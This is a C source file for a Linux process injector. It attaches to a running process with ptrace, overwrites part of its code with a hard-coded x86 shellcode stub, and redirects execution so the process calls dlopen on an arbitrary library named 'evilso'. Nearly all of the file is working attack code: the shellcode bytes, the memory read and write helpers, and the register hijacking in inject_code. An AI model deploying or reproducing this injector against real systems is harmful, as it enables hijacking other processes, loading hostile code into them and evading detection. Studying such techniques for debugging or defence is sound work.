#include "utils.h"

unsigned char
    soloader[] =
	"\x90"
	"\xeb\x13"
	"\x58"
	"\xba\x01\x00\x00\x00"
	"\x52"
	"\x50"
	"\xbb\x03\x00\x00\x00"
	"\xff\xd3"
	"\x83\xc4\x08"
	"\xcc"
	"\xe8\xe8\xff\xff\xff";

void ptrace_attach(int pid)
{
    if ((ptrace(PTRACE_ATTACH, pid, NULL, NULL)) < 0)
    {
		perror("ptrace_attach");
		exit(-1);
    }

    waitpid(pid, NULL, WUNTRACED);
}

void ptrace_cont(int pid)
{
    int s;

    if ((ptrace(PTRACE_CONT, pid, NULL, NULL)) < 0)
    {
	perror("ptrace_cont");
	exit(-1);
    }

    while (!WIFSTOPPED(s))
	waitpid(pid, &s, WNOHANG);
}

void ptrace_detach(int pid)
{
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0)
    {
	perror("ptrace_detach");
	exit(-1);
    }
}

bool ptrace_read(int pid, unsigned long addr, void *data, unsigned int len)
{
    int bytesRead = 0;
    int i = 0;
    long word = 0;
    unsigned long *ptr = (unsigned long *)data;

    while (bytesRead < len)
    {
	word = ptrace(PTRACE_PEEKTEXT, pid, addr + bytesRead, NULL);
	if (word == -1)
	{
	    fprintf(stderr, "ptrace(PTRACE_PEEKTEXT) failed\n");
	    return false;
	}
	bytesRead += sizeof(long);
	if (bytesRead > len)
	{
	    memcpy(ptr + i, &word, sizeof(long) - (bytesRead - len));
	    break;
	}
	ptr[i++] = word;
    }

    return true;
}

long
ptrace_memory_search(int pid, long start, long end, void *data, long len)
{
    long addr = start;
    char *buf = (char *)malloc(len);
    while(addr < end)
    {
        if(ptrace_read(pid, addr, buf, len))
            if(!memcmp(buf, data, len))
                return addr;
        addr += len;
    }
    return 0;
}

char *
ptrace_read_string(int pid, unsigned long start)
{
    char x = '\0';
    long end;
    char *str = NULL;
    end = ptrace_memory_search(pid, start, start+0x1000, &x, 1);
    if(!end)
        return NULL;
    str = (char *)malloc(end-start);
    if(ptrace_read(pid, start, str, end-start))
        return str;
    return NULL;
}

void ptrace_write(int pid, unsigned long addr, void *vptr, int len)
{
    int byteCount = 0;
    long word = 0;

    while (byteCount < len)
    {
	memcpy(&word, vptr + byteCount, sizeof(word));
	word = ptrace(PTRACE_POKETEXT, pid, addr + byteCount, word);
	if (word == -1)
	{
	    fprintf(stderr, "ptrace(PTRACE_POKETEXT) failed\n");
	    exit(1);
	}
	byteCount += sizeof(word);
    }
}

void setaddr(unsigned char *buf, ElfW(Addr) addr)
{
    *(buf) = addr;
    *(buf + 1) = addr >> 8;
    *(buf + 2) = addr >> 16;
    *(buf + 3) = addr >> 24;
}

void
inject_code(int pid, char *evilso, long dlopen_addr, long inject_position) {
	struct	user_regs_struct regz, regzbak;
	unsigned long len;
	unsigned char *backup = NULL;
	unsigned char *loader = NULL;

	setaddr(soloader + 12, dlopen_addr);

	printf("[+] entry point: 0x%x\n", inject_position);

	len = sizeof(soloader) + strlen(evilso);
	loader = malloc(sizeof(char)  *len);
	memcpy(loader, soloader, sizeof(soloader));
	memcpy(loader+sizeof(soloader) - 1 , evilso, strlen(evilso));

	backup = malloc(len + sizeof(long));
	ptrace_read(pid, inject_position, backup, len);

	if(ptrace(PTRACE_GETREGS , pid , NULL , &regz) < 0) exit(-1);
	if(ptrace(PTRACE_GETREGS , pid , NULL , &regzbak) < 0) exit(-1);
	printf("[+] stopped %d at eip:%p, esp:%p\n", pid, regz.eip, regz.esp);

	regz.eip = inject_position + 2;

	/*code inject */
	ptrace_write(pid, inject_position, loader, len);

	/*set eip as entry_point */
	ptrace(PTRACE_SETREGS , pid , NULL , &regz);
	ptrace_cont(pid);

	if(ptrace(PTRACE_GETREGS , pid , NULL , &regz) < 0) exit(-1);
	printf("[+] inject code done %d at eip:%p\n", pid, regz.eip);

	/*restore backup data */
	// ptrace_write(pid,entry_addr, backup, len);
	ptrace(PTRACE_SETREGS , pid , NULL , &regzbak);
}